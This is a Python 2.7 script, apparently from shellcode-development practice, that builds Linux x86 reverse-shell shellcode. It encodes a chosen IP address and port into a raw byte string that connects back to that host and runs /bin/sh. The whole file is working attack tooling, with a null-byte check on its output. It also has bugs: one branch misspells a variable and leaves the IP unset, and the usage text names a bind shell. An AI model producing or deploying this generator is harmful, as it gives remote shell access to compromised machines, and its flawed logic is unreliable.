#!/usr/bin/python2.7

import os
import sys

ip_address = str(sys.argv[1])
port_number = str(sys.argv[2])

print 'IP: ' + ip_address + ' PORT: ' + port_number

splitted_ip_address = []
hex_item_ip_address = []
# Check if port number is above 1024 and below 65535

if int(port_number) < 1024 or int(port_number) > 65535:
	print ''
	print 'The port number is below 1024, please choose between 1024 and 65535'
	print 'Usage: $shell_bind_tcp.py IP_ADDRESS PORT_NUMBER'
	print 'example: $shell_bind_tcp.py 192.168.92.10 1234'
	print ''

else:
	print hex(int(port_number))
	if len(hex(int(port_number))) < 6:
		hex_port_number = str(hex(int(port_number)))
		hex_port_number = '0' + hex_port_number[2:]
		new_port_number = '\\x' + hex_port_number[:2] + '\\x' + hex_port_number[2:]

		splited_ip_address = ip_address.split('.')
		for item in splitted_ip_address:
			print item

	elif len(hex(int(port_number))) == 6:
		hex_port_number = str(hex(int(port_number)))[2:]
		new_port_number = '\\x' + hex_port_number[:2] + '\\x' + hex_port_number[2:]

		splitted_ip_address = ip_address.split('.')
		for item in splitted_ip_address:
			hex_item_ip_address += '\\x' + hex(int(item))[2:]
			new_ip_address = ''.join(hex_item_ip_address)


	# Check if there are zeros
	if new_port_number[3:5] == '00' or new_port_number[8:] == '00':
		print 'There are bad characters, please choose different port number'
	else:
		shellcode = '"\\x31\\xc0\\x31\\xdb\\x31\\xd2\\x31\\xf6\\xb0\\x66\\xb3\\x01\\x52\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc6\\x31\\xc0\\xb0\\x66\\x43\\x43\\x68' + new_ip_address + '\\x66\\x68' + new_port_number + '\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\xcd\\x80\\x31\\xc9\\xb1\\x02\\x89\\xf3\\x31\\xc0\\xb0\\x3f\\xcd\\x80\\x49\\x79\\xf9\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80"'
		print ''
		print 'Your new reverse shellcode with ' + ip_address + ' a new ip address and ' + port_number + ' a new port number:'
		print shellcode